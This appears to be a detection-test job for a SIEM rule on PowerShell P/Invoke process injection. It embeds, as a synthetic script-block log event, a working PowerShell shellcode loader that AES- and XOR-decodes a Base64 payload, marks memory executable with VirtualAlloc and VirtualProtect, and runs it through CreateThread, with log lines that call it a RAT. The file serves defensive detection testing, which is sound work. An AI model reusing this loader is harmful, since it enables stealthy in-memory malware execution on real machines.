@@ -1,0 +1,158 @@
+type: job
+name: PowerShell PInvoke Process Injection API Chain
+detection:
+  source: escu
+  name: "ESCU - PowerShell PInvoke Process Injection API Chain - Rule"
+  id: 3f1a2b4c-d5e6-7890-abcd-ef1234567890
+description: |
+  Validates detection of PowerShell shellcode execution through a P/Invoke
+  API chain: PowerShell/Operational EID 4104 (Script Block Logging) records
+  the final part of a long block, read from a script file, that decodes a
+  Base64 payload and decrypts it with AES and a single-byte XOR, uses
+  Add-Type to compile a class importing VirtualAlloc, VirtualProtect and
+  CreateThread from kernel32.dll with DllImport, then calls them to copy the
+  decrypted bytes into newly allocated memory, make it executable and start
+  a thread on it.
+
+mitre:
+  tactics: [execution, privilege-escalation, defense-evasion]
+  techniques: [T1055.001, T1055.003, T1055.004, T1055.012, T1055.013, T1059.001, T1620]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  level:              3
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      level:             ref.level
+      message_number:    "23"
+      message_total:     "23"
+      script_path:       "C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\TofXANGh.ps1"
+      script_block_text: "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\"\n\
+        \x20   $payload_b64 = $b64p1 + $b64p2 + $b64p3 + $b64p4\n\
+        \x20   \n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] B64 len: $($payload_b64.Length)\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   $d = [Convert]::FromBase64String($payload_b64)\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] Decoded len: $($d.Length)\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   $k = $d[0]\n\
+        \x20   $s = $d[1..32]\n\
+        \x20   $v = $d[33..48]\n\
+        \x20   $c = $d[49..($d.Length-1)]\n\
+        \x20   \n\
+        \x20   $key = [Security.Cryptography.SHA256]::Create().ComputeHash($s + [Text.Encoding]::UTF8.GetBytes(\"diamon\"))\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] AES key computed\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   $aes = [Security.Cryptography.Aes]::Create()\n\
+        \x20   $aes.Key = $key\n\
+        \x20   $aes.IV = $v\n\
+        \x20   $aes.Mode=\"CBC\"\n\
+        \x20   $aes.Padding=\"PKCS7\"\n\
+        \x20   \n\
+        \x20   $dec = $aes.CreateDecryptor().TransformFinalBlock($c,0,$c.Length)\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] AES dec len: $($dec.Length)\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   $sc = New-Object Byte[] $dec.Length\n\
+        \x20   for($i=0;$i -lt $dec.Length;$i++){\n\
+        \x20       $sc[$i]=$dec[$i] -bxor $k\n\
+        \x20   }\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] XOR dec, sc len: $($sc.Length)\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   Add-Type -TypeDefinition @'\n\
+        using System;\n\
+        using System.Runtime.InteropServices;\n\
+        public class K {\n\
+        \x20   [DllImport(\"kernel32.dll\")]\n\
+        \x20   public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\n\
+        \x20   [DllImport(\"kernel32.dll\")]\n\
+        \x20   public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);\n\
+        \x20   [DllImport(\"kernel32.dll\", SetLastError=true)]\n\
+        \x20   public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\
+        \x20   [DllImport(\"kernel32.dll\", SetLastError=true)]\n\
+        \x20   public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);\n\
+        \x20   [DllImport(\"kernel32.dll\")]\n\
+        \x20   public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\
+        }\n\
+        '@\n\
+        \x20   \n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] P/Invoke loaded\" | Out-File $log -Append\n\
+        \x20   $Thinking = $env:COMPUTERNAME\n\
+        \x20   \n\
+        \x20   Start-Sleep -Seconds 14\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] Delay done\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   $mem = [K]::VirtualAlloc([IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x04)\n\
+        \x20   if ($mem -eq [IntPtr]::Zero) {\n\
+        \x20       \"[[$(Get-Date -Format 'HH:mm:ss')]] Alloc fail: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())\" | Out-File $log -Append\n\
+        \x20       exit\n\
+        \x20   }\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] Mem at: 0x$($mem.ToString('X'))\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   Start-Sleep -Milliseconds 422\n\
+        \x20   $Modest = Get-Date\n\
+        \x20   \n\
+        \x20   [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] Copy done\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   $oldProt = [uint32]0\n\
+        \x20   [K]::VirtualProtect($mem, [uint32]$sc.Length, 0x40, [ref]$oldProt) | Out-Null\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] Protect changed, old: $oldProt\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   Start-Sleep -Milliseconds 552\n\
+        \x20   \n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] About to create thread...\" | Out-File $log -Append\n\
+        \x20   \n\
+        \x20   try {\n\
+        \x20       $th = [K]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n\
+        \x20       \"[[$(Get-Date -Format 'HH:mm:ss')]] Thread handle: 0x$($th.ToString('X'))\" | Out-File $log -Append\n\
+        \x20       \n\
+        \x20       try {  \n\
+        \x20           $waitRes = [K]::WaitForSingleObject($th, 4294967295)  \n\
+        \x20           \"[[$(Get-Date -Format 'HH:mm:ss')]] Wait result: $waitRes\" | Out-File $log -Append  \n\
+        \x20       } catch {  \n\
+        \x20           \"[[$(Get-Date -Format 'HH:mm:ss')]] Wait exception: $_\" | Out-File $log -Append  \n\
+        \x20       }  \n\
+        \x20       \"[[$(Get-Date -Format 'HH:mm:ss')]] Wait result: $waitRes\" | Out-File $log -Append\n\
+        \x20       $exitCode = [uint32]0\n\
+        \x20       [K]::GetExitCodeThread($th, [ref]$exitCode) | Out-Null\n\
+        \x20       \"[[$(Get-Date -Format 'HH:mm:ss')]] RAT thread exit code: $exitCode\" | Out-File $log -Append\n\
+        \x20       if ($exitCode -ne 0) {\n\
+        \x20           \"[[$(Get-Date -Format 'HH:mm:ss')]] WARNING: RAT may have crashed (non-zero exit)\" | Out-File $log -Append\n\
+        \x20       }\n\
+        \x20       \n\
+        \x20       if ($th -eq [IntPtr]::Zero) {\n\
+        \x20           $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\
+        \x20           \"[[$(Get-Date -Format 'HH:mm:ss')]] CreateThread failed, error: $err\" | Out-File $log -Append\n\
+        \x20       } else {\n\
+        \x20           \"[[$(Get-Date -Format 'HH:mm:ss')]] Thread created successfully\" | Out-File $log -Append\n\
+        \x20       }\n\
+        \x20   } catch {\n\
+        \x20       \"[[$(Get-Date -Format 'HH:mm:ss')]] CreateThread exception: $_\" | Out-File $log -Append\n\
+        \x20   }\n\
+        \x20   \n\
+        \x20   Start-Sleep -Milliseconds 194\n\
+        \x20   Start-Sleep -Milliseconds 371\n\
+        \x20   \n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] End\" | Out-File $log -Append\n\
+        \x20   \n\
+        } catch {\n\
+        \x20   $errLog = \"$env:TEMP\\ps_error_4MDEiimp.log\"\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] GLOBAL ERROR: $_\" | Out-File $errLog -Encoding utf8 -Force\n\
+        \x20   \"[[$(Get-Date -Format 'HH:mm:ss')]] Stack: $($_.ScriptStackTrace)\" | Out-File $errLog -Append\n\
+        }\n\
+        \r\n"
+    expectation:
+      expected: alert
+      summary: "PowerShell runs Add-Type P/Invoke VirtualAlloc, VirtualProtect and CreateThread"
+      mitre:
+        tactics: [execution, privilege-escalation, defense-evasion]
+        techniques: [T1055.001, T1055.003, T1055.004, T1055.012, T1055.013, T1059.001, T1620]
